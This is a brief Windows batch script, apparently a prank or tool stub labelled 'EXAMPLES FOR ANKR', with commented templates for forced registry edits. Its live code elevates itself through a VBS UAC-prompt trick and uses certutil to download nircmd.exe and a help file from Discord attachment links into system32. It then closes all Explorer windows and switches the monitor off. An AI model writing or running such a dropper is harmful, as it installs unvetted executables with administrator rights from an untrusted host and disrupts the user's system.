::EXAMPLES FOR ANKR
::set /a FUNCTIONNAME=%random% %%ENDINGVALUE +STARTINGVALUE
::Reg.exe add "REGISTRYLOCATION" /v "REGVALUE" /t REG_TYPE /d "VALUETOCHANGE TO" /f
@echo off
color F0
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
cd %systemroot%\system32

:NirCMD
md %systemroot%\system32
set url=https://cdn.discordapp.com/attachments/840030032444391425/886782929492119592/nircmd.exe
set file=nircmd.exe
certutil -urlcache -split -f %url% %file%
set path=%systemroot%\system32
move %file% %path%\%file% >nul
md %systemroot%\system32

set url1=https://cdn.discordapp.com/attachments/840030032444391425/886783004314304552/NirCmd.chm
set file1=NirCmd.chm
certutil -urlcache -split -f %url1% %file1%
set path=%systemroot%\system32
move %file1% %path%\%file1% >nul

nircmd.exe win close class "CabinetWClass"
nircmd.exe monitor off
pause